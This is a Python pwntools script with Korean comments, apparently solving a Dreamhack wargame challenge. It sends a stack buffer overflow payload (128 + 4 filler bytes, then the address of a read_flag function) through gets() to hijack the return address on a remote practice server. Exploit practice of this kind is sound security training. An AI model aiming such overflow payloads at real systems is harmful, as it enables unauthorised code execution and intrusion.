'''
<스택> 
buf 128바이트
main전의 rbp 4바이트
main전의 ret 4바이트

<전략>
gets함수로 입력받은 데이터를 buf 영역에 저장한다.(패딩은 없을 가능성이 높고, 카나리 기법은 적용되지 않음)
[128바이트 더미] + [4바이트 더미] + [4바이트 read_flag의 시작위치]
'''

from pwn import *

context.arch = "i386"

p = remote('host3.dreamhack.games', 13567)	# 원격 서버에 연결

read_flag_addr = 0x080485b9
read_flag_addr = p32(read_flag_addr)
# gdb로 확인한 buf의 스택 시작주소 : 0xffffccf8 = 근데 이 문제가 buf의 스택 시작주소가 어떤 환경에서든지 동일할것이라는 보장이 없음 -> 때문에 매우 미흡한 코드임
# gdb로 확인한 read_flag의 스택 시작주소 : 0x080485b9
# 두 주소간의 offset을 고려하면 buf의 주소만으로도 read_flag의 위치를 구해서 오버라이트가 가능해진다.
# 그러나 buf의 시작주소를 알수가 없음 -> 때문에 무지성으로 read_flag의 스택 시작주소를 넣어봄

buf_ = b'A' *128
buf_ += b'B' *4
buf_ += read_flag_addr
payload = buf_

p.send(payload)

p.interactive()

